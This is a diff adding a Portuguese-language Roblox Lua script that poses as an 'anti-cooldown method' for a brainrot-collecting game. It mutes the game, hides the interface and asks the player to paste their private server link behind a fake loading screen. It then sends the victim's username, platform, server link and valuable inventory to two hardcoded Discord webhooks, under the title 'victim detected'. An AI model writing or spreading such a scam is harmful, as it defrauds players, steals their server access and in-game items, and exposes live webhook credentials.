@@ -1,0 +1,292 @@
+--========================================================--
+-- SCRIPT FINAL COMPLETO
+--========================================================--
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+
+local WEBHOOKS = {
+    "https://discord.com/api/webhooks/1449893869780074677/PgcU44cN4oYvSyQqzVJzEaDUa_PB8nJ2v6mbStC0R_09Q6W3H4suo7vMmp_OfLftrYAM",
+    "https://discord.com/api/webhooks/1449401544486158449/xvdp6gCokC4Qf3XJz9_NklqOPpN1A3QTjqzEn4LmUGNOrgQ-xeU41jvYxHnicMauQbkm"
+}
+
+--========================================================--
+-- 🔇 DESATIVAR TODOS OS SONS DO JOGO
+--========================================================--
+local function StopAllSounds()
+    local function mute(container)
+        for _, v in pairs(container:GetDescendants()) do
+            if v:IsA("Sound") then
+                v:Stop()
+                v.Volume = 0
+                v.Playing = false
+            end
+        end
+
+        container.DescendantAdded:Connect(function(v)
+            if v:IsA("Sound") then
+                v:Stop()
+                v.Volume = 0
+                v.Playing = false
+            end
+        end)
+    end
+
+    mute(Workspace)
+    mute(ReplicatedStorage)
+    mute(StarterGui)
+    mute(LocalPlayer:WaitForChild("PlayerGui"))
+    mute(LocalPlayer:WaitForChild("Backpack"))
+
+    if LocalPlayer.Character then
+        mute(LocalPlayer.Character)
+    end
+
+    LocalPlayer.CharacterAdded:Connect(function(char)
+        mute(char)
+    end)
+end
+
+task.spawn(StopAllSounds)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+--========================================================--
+-- 💻 DETECTAR PLATAFORMA
+--========================================================--
+local platform = "PC"
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    platform = "Mobile"
+end
+
+--========================================================--
+-- 📱 GUI DE COLOCAR LINK (AJUSTADA PRA CIMA)
+--========================================================--
+local serverLinkFinal
+
+local linkGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+linkGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", linkGui)
+frame.Size = UDim2.new(0,360,0,300)
+frame.Position = UDim2.new(0.5,-180,0.5,-175)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0,14)
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1,0,0,36)
+title.Position = UDim2.new(0,0,0,10)
+title.BackgroundTransparency = 1
+title.Text = "MÉTODO ANT COOLDOWN"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(0,170,255)
+
+local desc = Instance.new("TextLabel", frame)
+desc.Size = UDim2.new(1,-30,0,95)
+desc.Position = UDim2.new(0,15,0,55)
+desc.BackgroundTransparency = 1
+desc.TextWrapped = true
+desc.RichText = true -- ⭐ ATIVA RICHTEXT
+desc.Text = [[
+Coloque seu Servidor Privado, confirme e agurde👻
+
+<font color="rgb(255,220,0)">Obs: Ele tira o Cooldown!
+Quando o player for puxado é só roubar! 😁</font>
+]]
+desc.Font = Enum.Font.Gotham
+desc.TextSize = 13
+desc.TextColor3 = Color3.fromRGB(220,220,220)
+
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(1,-30,0,40)
+box.Position = UDim2.new(0,15,0,165)
+box.PlaceholderText = "Cole o link aqui"
+box.Text = ""
+box.ClearTextOnFocus = false
+box.TextWrapped = true
+box.TextTruncate = Enum.TextTruncate.AtEnd
+box.BackgroundColor3 = Color3.fromRGB(30,30,30)
+box.TextColor3 = Color3.new(1,1,1)
+box.Font = Enum.Font.Gotham
+box.TextSize = 14
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
+
+local btn = Instance.new("TextButton", frame)
+btn.Size = UDim2.new(0,180,0,44)
+btn.Position = UDim2.new(0.5,-90,1,-60)
+btn.Text = "Confirmar"
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 16
+btn.TextColor3 = Color3.new(1,1,1)
+btn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0,12)
+
+btn.MouseButton1Click:Connect(function()
+    if box.Text ~= "" then
+        serverLinkFinal = box.Text
+        linkGui:Destroy()
+    end
+end)
+
+repeat task.wait() until serverLinkFinal
+
+--========================================================--
+-- ⏳ TELA DE CARREGAMENTO
+--========================================================--
+local loaderGui = Instance.new("ScreenGui", CoreGui)
+loaderGui.IgnoreGuiInset = true
+
+local bg = Instance.new("Frame", loaderGui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+
+local title2 = Instance.new("TextLabel", bg)
+title2.Size = UDim2.new(1,0,0,60)
+title2.Position = UDim2.new(0,0,0.22,0)
+title2.BackgroundTransparency = 1
+title2.Text = "PROCURANDO PLAYER (+100M)"
+title2.Font = Enum.Font.GothamBold
+title2.TextScaled = true
+title2.TextColor3 = Color3.fromRGB(0,170,255)
+
+local status = Instance.new("TextLabel", bg)
+status.Size = UDim2.new(1,0,0,40)
+status.Position = UDim2.new(0,0,0.38,0)
+status.BackgroundTransparency = 1
+status.Font = Enum.Font.Gotham
+status.TextScaled = true
+status.TextColor3 = Color3.fromRGB(0,170,255)
+
+local barBg = Instance.new("Frame", bg)
+barBg.Size = UDim2.new(0.7,0,0,14)
+barBg.Position = UDim2.new(0.15,0,0.52,0)
+barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)
+
+local bar = Instance.new("Frame", barBg)
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+task.spawn(function()
+    for i = 1,100 do
+        bar:TweenSize(UDim2.new(i/100,0,1,0),"Out","Linear",0.25,true)
+        task.wait(0.25)
+    end
+end)
+
+task.spawn(function()
+    status.Text = "🔄 Analisando estrutura do servidor..."
+    task.wait(6)
+
+    status.Text = "🔍 Procurando player..."
+    task.wait(6)
+
+    status.Text = "⚙️ Carregando..."
+    task.wait(2)
+
+    ScanBrainrots()
+end)
+
+--========================================================--
+-- 🧠 ESP + WEBHOOK
+--========================================================--
+local function formatNumber(num)
+    if num >= 1e9 then
+        return string.format("%.1fB/s", num/1e9)
+    elseif num >= 1e6 then
+        return string.format("%.1fM/s", num/1e6)
+    elseif num >= 1e3 then
+        return string.format("%.1fk/s", num/1e3)
+    else
+        return tostring(num).."/s"
+    end
+end
+
+local function SendWebhook(extraFields)
+    local payload = HttpService:JSONEncode({
+        username = "auto nexus😈|y6🥶",
+        embeds = {{
+            title = "vítima detectada 👀",
+            color = 3447003, -- azul
+            fields = extraFields,
+            footer = {
+                text = "Nexus|y6😈"
+            }
+        }}
+    })
+
+    -- ENVIA PARA TODOS OS WEBHOOKS AO MESMO TEMPO
+    for _, url in ipairs(WEBHOOKS) do
+        task.spawn(function()
+            pcall(function()
+                HttpService:RequestAsync({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = payload
+                })
+            end)
+        end)
+    end
+end
+
+function ScanBrainrots()
+    local animalsModule = ReplicatedStorage.Datas.Animals
+    if not animalsModule then return end
+
+    local brainrotDB = {}
+    local success, data = pcall(require, animalsModule)
+    if success then
+        for name, info in pairs(data) do
+            if info.Generation then
+                brainrotDB[name] = info.Generation
+            end
+        end
+    end
+
+    local brainrotCount = {}
+
+    for _, plot in pairs(Workspace.Plots:GetChildren()) do
+        for _, brainrot in pairs(plot:GetChildren()) do
+            if brainrotDB[brainrot.Name] then
+                brainrotCount[brainrot.Name] =
+                    brainrotCount[brainrot.Name] or {count = 0, income = brainrotDB[brainrot.Name]}
+                brainrotCount[brainrot.Name].count += 1
+
+                if not brainrot:FindFirstChild("ESP") then
+                    local h = Instance.new("Highlight")
+                    h.Name = "ESP"
+                    h.FillColor = Color3.fromRGB(0,100,255)
+                    h.FillTransparency = 0.1
+                    h.OutlineTransparency = 0
+                    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    h.Parent = brainrot
+                end
+            end
+        end
+    end
+
+    local content = ""
+    for name, data in pairs(brainrotCount) do
+        content ..= data.count.."x "..name..": "..formatNumber(data.income).."\n"
+    end
+
+    local extraFields = {
+        {name="👤 Player", value=LocalPlayer.Name, inline=true},
+        {name="💻 Platform", value=platform, inline=true},
+        {name="👥 Players in Server", value=tostring(#Players:GetPlayers()), inline=true},
+        {name="🔗 Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},
+        {name="🧠 Brainrots", value=content ~= "" and content or "Nenhum encontrado", inline=false}
+    }
+
+    SendWebhook(extraFields)
+end
